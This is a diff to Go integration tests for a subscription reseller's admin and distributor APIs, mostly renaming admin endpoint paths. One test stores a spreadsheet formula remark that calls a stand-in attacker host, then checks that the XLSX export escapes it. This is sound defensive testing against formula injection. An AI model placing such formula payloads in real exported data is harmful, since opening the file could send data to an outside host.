@@ -24,7 +24,7 @@ func TestDistributorLegacyPurchaseRenewDeliveryAndAllowlist(t *testing.T) {
 	if _, err := database.UpdateLegacySiteSettings(t.Context(), 1, store.SaveLegacySiteSettingsInput{SubscribeURL: &publicOrigin}, fixedNow()); err != nil {
 		t.Fatal(err)
 	}
-	createdUser := admin.request(t, api, http.MethodPost, "/api/v1/admin/users", `{
+	createdUser := admin.request(t, api, http.MethodPost, "/api/v1/admin/admin/users", `{
 		"email":"dealer-api@example.test","password":"dealer-password-123","group_id":null,
 		"transfer_enable":0,"expired_at":null,"speed_limit":0,"device_limit":0,"banned":false,
 		"is_distributor":true,"distributor_name":"华东渠道"
@@ -206,19 +206,19 @@ func TestAdministratorDistributorOrderManagementAndSettlement(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	options := admin.request(t, api, http.MethodGet, "/api/v1/admin/distributors/options", "")
+	options := admin.request(t, api, http.MethodGet, "/api/v1/admin/admin/distributors/options", "")
 	if options.Code != http.StatusOK || !containsAll(options.Body.String(), `"id":`, `"email":"direct-dealer@example.test"`, `"distributor_name":"直连渠道"`) {
 		t.Fatalf("distributor options status=%d body=%s", options.Code, options.Body)
 	}
 	listed := admin.request(t, api, http.MethodGet, fmt.Sprintf(
-		"/api/v1/admin/distributor-orders?distributor_user_id=%d&settlement_status=0&search=%s",
+		"/api/v1/admin/admin/distributor-orders?distributor_user_id=%d&settlement_status=0&search=%s",
 		distributor.ID, created.Order.TradeNo), "")
 	if listed.Code != http.StatusOK || !containsAll(listed.Body.String(), created.Order.TradeNo,
 		`"is_subscription_origin":true`, `"settlement_status":0`, `"subscription_entitlement"`) ||
 		strings.Contains(listed.Body.String(), created.Subscription.SubscriptionToken) || strings.Contains(listed.Body.String(), created.Subscription.SubscriberUUID) {
 		t.Fatalf("distributor list status=%d body=%s", listed.Code, listed.Body)
 	}
-	detailPath := fmt.Sprintf("/api/v1/admin/distributor-orders/%d", created.Order.ID)
+	detailPath := fmt.Sprintf("/api/v1/admin/admin/distributor-orders/%d", created.Order.ID)
 	detail := admin.request(t, api, http.MethodGet, detailPath, "")
 	if detail.Code != http.StatusOK || !containsAll(detail.Body.String(), created.Order.TradeNo, `"registered_count":0`,
 		`"subscribe_url":"https://distributor-subscriptions.example.test/s/`) || strings.Contains(detail.Body.String(), `internal.invalid`) ||
@@ -262,7 +262,7 @@ func TestAdministratorDistributorOrderManagementAndSettlement(t *testing.T) {
 		t.Fatalf("delete HWID status=%d body=%s", deleted.Code, deleted.Body)
 	}
 
-	settlementPath := fmt.Sprintf("/api/v1/admin/distributors/%d/settlement", distributor.ID)
+	settlementPath := fmt.Sprintf("/api/v1/admin/admin/distributors/%d/settlement", distributor.ID)
 	preview := admin.request(t, api, http.MethodGet, settlementPath, "")
 	if preview.Code != http.StatusOK || !containsAll(preview.Body.String(), `"count":1`, `"total_amount":1000`) {
 		t.Fatalf("settlement preview status=%d body=%s", preview.Code, preview.Body)
@@ -359,7 +359,7 @@ func TestModernDistributorPortalOrderLifecycle(t *testing.T) {
 	api, database := newTestAPI(t)
 	plan := createOrderAPIPlan(t, database, store.PlanPrices{"monthly": 5_000, "quarterly": 14_000})
 	admin := loginAdmin(t, api)
-	createdUser := admin.request(t, api, http.MethodPost, "/api/v1/admin/users", `{
+	createdUser := admin.request(t, api, http.MethodPost, "/api/v1/admin/admin/users", `{
 		"email":"portal-dealer@example.test","password":"portal-dealer-password-123","group_id":null,
 		"transfer_enable":0,"expired_at":null,"speed_limit":0,"device_limit":0,"banned":false,
 		"is_distributor":true,"distributor_name":"门户渠道"
@@ -425,14 +425,14 @@ func TestModernDistributorPortalOrderLifecycle(t *testing.T) {
 		t.Fatalf("portal orders status=%d body=%s", listed.Code, listed.Body)
 	}
 	remark := admin.request(t, api, http.MethodPatch,
-		fmt.Sprintf("/api/v1/admin/distributor-orders/%d/remark", order.Order.ID), `{"remark":"=WEBSERVICE(\"https://attacker.invalid\")"}`)
+		fmt.Sprintf("/api/v1/admin/admin/distributor-orders/%d/remark", order.Order.ID), `{"remark":"=WEBSERVICE(\"https://attacker.invalid\")"}`)
 	if remark.Code != http.StatusOK {
 		t.Fatalf("set export formula remark status=%d body=%s", remark.Code, remark.Body)
 	}
 	exported := dealer.request(t, api, http.MethodGet, "/api/v1/distributor/orders/export", "")
 	assertDistributorXLSX(t, exported, "G2", "50.00", "&#39;=WEBSERVICE")
 	adminExport := admin.request(t, api, http.MethodGet,
-		fmt.Sprintf("/api/v1/admin/distributor-orders/export?distributor_user_id=%d", order.Subscription.DistributorUserID), "")
+		fmt.Sprintf("/api/v1/admin/admin/distributor-orders/export?distributor_user_id=%d", order.Subscription.DistributorUserID), "")
 	assertDistributorXLSX(t, adminExport, "H2", "50.00", "门户渠道")
 }
 
